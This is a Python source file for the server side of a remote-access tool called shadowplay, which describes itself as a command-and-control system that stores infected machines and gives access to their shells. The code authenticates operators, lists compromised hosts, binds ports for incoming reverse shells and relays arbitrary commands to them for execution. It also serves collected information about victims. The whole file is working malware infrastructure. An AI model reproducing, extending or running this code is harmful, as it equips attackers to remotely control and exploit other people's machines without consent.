#!/bin/python3

from argparse import ArgumentParser
import socket
import secrets
from datetime import datetime
from time import sleep
from subprocess import Popen, PIPE

parser = ArgumentParser(usage="python3 shadowsrv.py -p [PORT]",
                        prog="shadowsrv: shadowplay node implementation.",
                        description="Bind connections from shadowplay client's. Store infected machines and give acess to the shells.",
                        epilog="See https://github.com/entr0pie/shadowplay for more information.")

parser.add_argument("-p", "--port", type=int, required=False, default=10000, help="bind port")
args = parser.parse_args()

print("\n<< shadowplay-node command-and-control (C&C) system >>\n")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("Starting server...")

server.bind(("0.0.0.0", args.port))
server.listen(5)

def validate_token(TOKEN: str) -> bool:
    token_file = open('tokens.tmp').readlines()
    is_valid = False

    for tk in token_file: 
        tk = tk.strip()
            
        if TOKEN == tk:
            is_valid = True
            break

    return is_valid

print("Getting external IP Address... ")

ifconfig = Popen(["curl", "-s", "ifconfig.me"], stdout=PIPE)
external_ip = ifconfig.communicate()
external_ip = (external_ip[0].decode()).strip()

print(f"* Server hosted on {external_ip}:{args.port} *")

while True:
    conn, addr = server.accept()
    
    ip_address = addr[0]
    
    now = datetime.now()
    clock = now.strftime("%H:%M:%S")
    
    print(f"{clock} ({ip_address}) --> ({external_ip}):", end=" ")
    
    command = conn.recv(1024)
    command = command.decode()
    
    if command == "PING":
        print("PING")
        conn.send(b"PONG")
        
        print(f"{clock} ({external_ip}) --> ({ip_address}): PONG")

    elif command[:5] == "LOGIN":
        TOKEN, response = "", ""
        
        file = open('users.txt', 'r').readlines()
        command = command.removeprefix("LOGIN")
        login_cred, passwd_cred = command[:32], command[32:]
        
        print(f"LOGIN {login_cred}:{passwd_cred}")
        print(f"{clock} ({external_ip}): Checking credentials...")
        
        for line in file:
            line = line.strip()
            user, passwd = line.split(':')
            
            if login_cred == user and passwd_cred == passwd: 
                TOKEN = secrets.token_hex(16)
                print(f"{clock} ({external_ip}): Credentials validated. Logging in...")
                print(f"{clock} ({external_ip}): Added {TOKEN} in tokens.tmp")
                token_file = open('tokens.tmp', 'w')
                token_file.write(TOKEN + '\n')
                token_file.close()
                response = "OK" + TOKEN
                break

        if TOKEN == "": 
            print(f"{clock} ({external_ip}): Authentication failed. Rejecting connection.")
            response = "NO"
        
        print(f"{clock} ({external_ip}) --> ({ip_address}): {response[:2]}")

        conn.send(response.encode())

    elif command[:3] == "GSS":
        token = command[3:]
        
        print(f"GSS ({token})")
        print(f"{clock} ({external_ip}): Checking token...")
        
        if not validate_token(token):
            print(f"{clock} ({external_ip}): Invalid token, denying session.")
            response = "NO"
            conn.send(response.encode())

        else:
            print(f"{clock} ({external_ip}): Token OK. Proceeding.")
            response = "OK" 
            conn.send(response.encode())
            sleep(0.5)
           
            print(f"{clock} ({external_ip}): Opening up sessions.txt")
            sessions = open('sessions.txt', 'r').read()
            
            print(f"{clock} ({external_ip}): Sending sessions.txt lenght") 
            response = str(len(sessions))
            conn.send(response.encode())
            sleep(0.5)

            print(f"{clock} ({external_ip}): Sending available hosts")
            response = sessions
            conn.send(response.encode())

    elif command[:7] == "CONNECT":
        token = command[7:39]
        shell_addr = command[39:]
        print(f"CONNECT ({token}) -> {shell_addr}")

        print(f"{clock} ({external_ip}): Checking token...")
        
        if validate_token(token):
            print(f"{clock} ({external_ip}): Token OK. Proceeding.")
            
            conn.send(b"OK")
            
            ADDRESS, PORT = shell_addr.split(":")
            PORT = int(PORT)
        
            print(f"{clock} ({external_ip}): Binding port to shell...")
            
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((ADDRESS, PORT))
            server.listen(1)
        
            conn.send(b"WAIT")
            
            shell, shell_addr = server.accept()
            
            print(f"{clock} ({external_ip}): Shell connected. Receiving commands from now.")
             
            conn.send(b"OK")

            while True:
                cmd = conn.recv(1024).decode().strip()
                 
                if cmd == 'EXIT':
                    print(f"{clock} ({external_ip}): Ending session.")
                    shell.send(b"EXIT")
                    shell.close()
                    break

                cmd = "EXEC:" + cmd
                
                shell.send(cmd.encode())
            
                is_ok = shell.recv(2)
                
                response = shell.recv(1024)
                
                conn.send(response)
        
        else:
            print(f"{clock} ({external_ip}): Invalid token, denying session.")
            conn.send(b"NO")

    elif command[:7] == "GETINFO":
        token = command[7:39]
        shell_addr = command[39:]
        
        print(f"GET INFO ({token}) -> {shell_addr}")
        print(f"{clock} ({external_ip}): Checking token...")

        if validate_token(token):
            print(f"{clock} ({external_ip}): Token OK. Proceeding.")
            
            conn.send(b"OK")
            
            ADDRESS, PORT = shell_addr.split(":")
            PORT = int(PORT)
            print(f"{clock} ({external_ip}): Searching for shell json file...")
            
            file = open(f'info/{ADDRESS}.json').read()
            size = len(file)
            conn.send(str(size).encode())

            conn.send(file.encode())
    
